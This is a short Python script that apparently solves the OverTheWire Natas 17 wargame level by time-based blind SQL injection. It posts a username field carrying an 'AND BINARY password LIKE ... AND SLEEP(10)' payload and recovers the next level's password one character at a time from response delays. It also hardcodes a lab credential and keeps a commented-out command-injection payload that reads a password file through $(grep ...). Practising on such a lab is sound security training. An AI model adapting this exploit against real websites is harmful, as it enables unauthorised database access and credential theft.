#!/usr/bin/python3
# Time: 2019/04/22 7:28 PM



import re
import time
import requests
import base64
import urllib
import codecs

from string import ascii_letters, digits
# print(ascii_letters+digits)

"""
1. TIMING ATTACK SQL Injection
通过计算时间来判断数据是否存在
2. SQL 语句
<something> AND SLEEP(<time>)

"""



username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url = f'http://{username}.natas.labs.overthewire.org/'
s = requests.Session()
characters = ascii_letters + digits


# seen_password = list()
seen_password = list("xvKIqDjy40Pv7wCRgDlmj0pFsCsD")


while len(seen_password) < 32:
    for ch in characters:
        t1 = time.time()


        # print("".join(seen_password) + ch)
        # resp = s.post(url, auth=(username, password), data={"needle": "anythings$(grep ^" + "".join(seen_password) + ch + "  /etc/natas_webpass/natas17)"})
        resp = s.post(url, auth=(username, password), data={"username": 'natas18" AND BINARY password LIKE "' + "".join(seen_password) + ch + '%" AND SLEEP(10) # '})
        content = resp.text

        t2 = time.time()
        cost = t2-t1
        print("trying  ", "".join(seen_password) + ch, "cost time :  ", cost)

        if cost > 8:
            seen_password.append(ch)
            print("this is the one ", ch)
            break

